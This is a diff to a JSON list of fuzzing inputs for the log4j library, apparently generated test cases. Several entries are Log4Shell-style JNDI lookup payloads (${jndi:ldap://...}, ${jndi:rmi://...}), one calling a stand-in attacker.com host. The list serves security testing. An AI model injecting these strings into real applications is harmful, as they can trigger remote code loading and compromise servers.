@@ -2,6 +2,5 @@
   "Here are some potential test cases for fuzzing the log4j library:\n\n1. fuzzPatternLayout:\n```\n%.-9223372036854775808s\n%t%r %p%n\n${jndi:ldap://example.com}\n```\n\n2. fuzzLogMessages:\n```\n\\x00\\xFF\\x1A\\x1B\\x1C\\x1D\\x1E\\x1F\n{\"key\": \"value\", \"jndi\": \"${jndi:rmi://localhost:1099/jndiLookup}\"}\n${jndi:ldap:///example.com}\n```\n\n3. fuzzJsonLayout:\n```\n{\"key\": \"value\", \"jndi\": \"${jndi:rmi://localhost:1099/jndiLookup}\", \"long\": \"a\".repeat(1_000_000)}\n${jndi:ldap:///example.com}\n\\x00\\xFF\\x1A\\x1B\\x1C\\x1D\\x1E\\x1F\n```\n\n4. fuzzMessagePattern:\n```\n%t%r %p%n\n{\"key\": \"value\", \"jndi\": \"${jndi:rmi://localhost:1099/jndiLookup}\"}\n${jndi:ldap:///example.com}\n\\x00\\xFF\\x1A\\x1B\\x1C\\x1D\\x1E\\x1F\n```\n\nPlease note that these test cases may not trigger all possible bugs or edge cases, but they should help in identifying some interesting behavior in log4j.",
   "`%n${jndi:ldap://example.com}`",
   "```\n${jndi:ldap://example.com}\n%d{yyyy-MM-dd HH:mm:ss,SSS} [%t] %-5p %c{1}:%L - ${jndi:ldap://example.com}\n{\"key\":\"value\",\"${jndi:ldap://example.com}\":\"\"}\n```",
-  "```\n%$^&*()-_=+[]{}|;:'\",.<>?/\\\\NDC{JNDI:ldap://attacker.com}\n```",
-  "```\n%$!@#$%^&*()_+{}[]|\\:;\"'<>,.?/~`\\\\n\\\\t\\\\r\\\\f\\1\\2\\3\\4\\5\\6\\7\n```"
+  "```\n%$^&*()-_=+[]{}|;:'\",.<>?/\\\\NDC{JNDI:ldap://attacker.com}\n```"
 ]
